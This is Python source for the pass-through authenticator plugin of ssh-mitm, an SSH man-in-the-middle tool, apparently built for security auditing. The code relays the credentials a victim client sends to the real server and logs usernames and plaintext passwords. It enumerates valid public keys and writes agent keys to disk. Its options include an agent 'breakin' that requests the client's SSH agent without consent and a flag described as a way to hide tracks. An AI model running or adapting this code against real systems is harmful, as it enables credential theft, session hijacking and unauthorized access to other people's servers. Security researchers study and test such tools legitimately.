import logging
import os
from typing import TYPE_CHECKING, List, Optional

import paramiko
from colored.colored import attr, fg  # type: ignore[import-untyped]
from paramiko import PKey
from paramiko.ssh_exception import ChannelException

from sshmitm import project_metadata
from sshmitm.core.authentication import Authenticator
from sshmitm.core.clients.ssh import AuthenticationMethod
from sshmitm.core.forwarders.agent import AgentProxy
from sshmitm.core.logger import Colors
from sshmitm.core.sshkeys import SSHPubKey
from sshmitm.core.userenumeration import PublicKeyEnumerationError, PublicKeyEnumerator

if TYPE_CHECKING:
    import sshmitm


class AuthenticatorPassThrough(Authenticator):
    """A subclass of `Authenticator` which passes the authentication to the remote server.

    This class reuses the credentials received from the client and sends it directly to the remote server for authentication.
    """

    @classmethod
    def parser_arguments(cls) -> None:
        super().parser_arguments()
        plugin_group = cls.argument_group()
        plugin_group.add_argument(
            "--close-pubkey-enumerator-with-session",
            dest="close_pubkey_enumerator_with_session",
            action="store_true",
            help="closes the pubkey enumerator when the session is close. This can be used to hide tracks.",
        )
        plugin_group.add_argument(
            "--request-agent-breakin",
            dest="request_agent_breakin",
            action="store_true",
            help=f"Enables {project_metadata.PROJECT_NAME} to request the SSH agent from the client, even if the client does not forward the agent. Can be used to attempt unauthorized access.",
        )

    def __init__(self, session: "sshmitm.core.session.Session") -> None:
        super().__init__(session=session)

        self.pubkey_enumerator: Optional[PublicKeyEnumerator] = None
        self.pubkey_auth_success: bool = False
        self.valid_key: Optional[PKey] = None

    def get_auth_methods(
        self, host: str, port: int, username: Optional[str] = None
    ) -> Optional[List[str]]:
        """
        Get the available authentication methods for a remote host.

        :param host: remote host address.
        :param port: remote host port.
        :param username: username which is used for authentication
        :return: a list of strings representing the available authentication methods.
        """
        logging.debug(
            "%s.get_auth_methods: host=%s, port=%s, username=%s",
            self.__class__.__name__,
            host,
            port,
            username,
        )
        if not self.pubkey_enumerator:
            self.pubkey_enumerator = PublicKeyEnumerator(host, port)
            self.pubkey_enumerator.connect()

        auth_methods = None
        if not self.pubkey_enumerator.transport:
            msg = "pubkey_enumerator not initialized"
            raise PublicKeyEnumerationError(msg)
        try:
            self.pubkey_enumerator.transport.auth_none(username or "")
        except paramiko.BadAuthenticationType as err:
            auth_methods = err.allowed_types
        return auth_methods

    def request_agent(self) -> bool:
        requested_agent = None
        if self.session.agent is None or self.args.request_agent_breakin:
            try:
                if (
                    self.session.agent_requested.wait(1)
                    or self.args.request_agent_breakin
                ):
                    requested_agent = AgentProxy(self.session.transport)
                    logging.info(
                        "%s %s - successfully requested ssh-agent",
                        Colors.emoji("information"),
                        Colors.stylize(
                            self.session.sessionid, fg("light_blue") + attr("bold")
                        ),
                    )
            except ChannelException:
                logging.info(
                    "%s %s - ssh-agent breakin not successfull!",
                    Colors.emoji("warning"),
                    Colors.stylize(
                        self.session.sessionid, fg("light_blue") + attr("bold")
                    ),
                )
                return False
        self.session.agent = requested_agent or self.session.agent
        return self.session.agent is not None

    def auth_agent(self, username: str, host: str, port: int) -> int:
        logging.debug(
            "%s.auth_agent: username=%s, host=%s, port=%s",
            self.__class__.__name__,
            username,
            host,
            port,
        )
        return self.connect(username, host, port, AuthenticationMethod.AGENT)

    def auth_password(self, username: str, host: str, port: int, password: str) -> int:
        logging.debug(
            "%s.auth_password: username=%s, host=%s, port=%s, password=%s",
            self.__class__.__name__,
            username,
            host,
            port,
            password,
        )
        return self.connect(
            username, host, port, AuthenticationMethod.PASSWORD, password=password
        )

    def auth_publickey(self, username: str, host: str, port: int, key: PKey) -> int:
        """
        Performs authentication using public key authentication.

        This method is checking if a user with a specific public key is allowed to log into a server
        using the SSH protocol. If the key can sign, the method will try to connect to the server
        using the public key. If the connection is successful, the user is considered authenticated.

        If the key cannot sign, the method will check if the key is valid for the host and port
        specified for the user. If the key is valid, the user is considered authenticated.

        If the key is not valid, or if there is any error while checking if the key is valid,
        the user will not be authenticated and will not be able to log in.
        """
        logging.debug(
            "%s.auth_publickey: username=%s, host=%s, port=%s, key=%s %s %sbits, key.can_sign=%s",
            self.__class__.__name__,
            username,
            host,
            port,
            key.get_name(),
            key.fingerprint,
            key.get_bits(),
            key.can_sign(),
        )

        if not self.pubkey_enumerator:
            logging.debug("created PublicKeyEnumerator(%s, %s)", host, port)
            self.pubkey_enumerator = PublicKeyEnumerator(host, port)

        if key.can_sign():
            return self.connect(
                username, host, port, AuthenticationMethod.PUBLICKEY, key=key
            )
        # A public key is only passed directly from check_auth_publickey.
        # In that case, we need to authenticate the client so that we can wait for the agent!
        publickey = paramiko.pkey.PublicBlob(key.get_name(), key.asbytes())
        try:
            # ssh sends first a publickey to check if this key is known.
            # to avoid a second key lookup, a valid key is stored and later during the
            # real authentication process, the key is compared with the known key.
            if self.pubkey_auth_success and self.valid_key == key:
                logging.debug("used valid_key from pre authentication")
                return paramiko.common.AUTH_SUCCESSFUL

            # this is only the pubkey lookup, which is done by all clients
            # we store the knwon key to avoid a second key lookup
            if self.pubkey_enumerator.check_publickey(username, publickey):
                logging.info(
                    "Found valid key for host %s:%s username=%s, key=%s %s %sbits",
                    host,
                    port,
                    username,
                    key.get_name(),
                    key.fingerprint,
                    key.get_bits(),
                )
                self.pubkey_auth_success = True
                self.valid_key = key
                return paramiko.common.AUTH_SUCCESSFUL
        except EOFError:
            logging.exception(
                "%s - faild to check if client is allowed to login with publickey authentication",
                self.session.sessionid,
            )
        return paramiko.common.AUTH_FAILED

    def post_auth_action(self, success: bool) -> None:  # noqa: C901
        """
        This method logs information about an authentication event.

        The success parameter determines whether the authentication was successful or not.
        If the authentication was successful, the log will show a message saying
        "Remote authentication succeeded".

        If not, the log will show "Remote authentication failed". The log will also show
        the remote address, username, and password used for authentication
        (if provided). Information about the accepted public key and remote public key
        (if any) will also be included in the log. If there is an agent available,
        the number of keys it has will be displayed, along with details about each key
        (name, hash, number of bits, and whether it can sign).

        All this information can be saved to a log file for later review.
        """
        logging.debug(
            "%s.post_auth_action: success=%s", self.__class__.__name__, success
        )

        def get_agent_pubkeys() -> List[SSHPubKey]:
            pubkeyfile_path = None

            keys_parsed: List[SSHPubKey] = []
            if self.session.agent is None:
                return keys_parsed

            keys = self.session.agent.get_keys()
            keys_parsed.extend(SSHPubKey(key) for key in keys)

            if self.session.session_log_dir:
                os.makedirs(self.session.session_log_dir, exist_ok=True)
                pubkeyfile_path = os.path.join(
                    self.session.session_log_dir, "publickeys"
                )
                with open(pubkeyfile_path, "a+", encoding="utf-8") as pubkeyfile:
                    for ssh_pub_key in keys_parsed:
                        comment = "saved-from-agent"
                        pubkeyfile.write(
                            f"{ssh_pub_key.get_name()} {ssh_pub_key.get_base64()} {comment}\n"
                        )

            return keys_parsed

        if (
            not self.args.close_pubkey_enumerator_with_session
            and self.pubkey_enumerator
            and self.pubkey_enumerator.connected
        ):
            self.pubkey_enumerator.close()

        logmessage = []
        if success:
            logmessage.append(
                Colors.stylize(
                    "Remote authentication succeeded", fg("green") + attr("bold")
                )
            )
        else:
            logmessage.append(Colors.stylize("Remote authentication failed", fg("red")))

        if self.session.ssh_client is not None:
            logmessage.append(
                f"\tRemote Address: {self.session.ssh_client.host}:{self.session.ssh_client.port}"
            )
            logmessage.append(f"\tUsername: {self.session.username_provided}")

        if self.session.password_provided:
            display_password = None
            if not self.args.auth_hide_credentials:
                display_password = self.session.password_provided
            logmessage.append(
                f"\tPassword: {display_password or Colors.stylize('*******', fg('dark_gray'))}"
            )

        if (
            self.session.accepted_key is not None
            and self.session.remote_key != self.session.accepted_key
        ):
            logmessage.append(
                "\tAccepted-Publickey: "
                f"{self.session.accepted_key.get_name()} {self.session.accepted_key.fingerprint} {self.session.accepted_key.get_bits()}bits"
            )

        if self.session.remote_key is not None:
            logmessage.append(
                f"\tRemote-Publickey: {self.session.remote_key.get_name()} {self.session.remote_key.fingerprint} {self.session.remote_key.get_bits()}bits"
            )

        ssh_keys = None
        if self.session.agent:
            ssh_keys = get_agent_pubkeys()

        logmessage.append(
            f"\tAgent: {f'available keys: {len(ssh_keys or [])}' if ssh_keys else 'no agent'}"
        )
        if ssh_keys is not None:
            logmessage.append(
                "\n".join(
                    [
                        f"\t\tAgent-Key: {k.get_name()} {k.hash_sha256()} {k.get_bits()}bits, can sign: {k.can_sign()}"
                        for k in ssh_keys
                    ]
                )
            )

        logging.info("\n".join(logmessage))

    def on_session_close(self) -> None:
        logging.debug("%s.on_session_close", self.__class__.__name__)
        if (
            self.args.close_pubkey_enumerator_with_session
            and self.pubkey_enumerator
            and self.pubkey_enumerator.connected
        ):
            self.pubkey_enumerator.close()
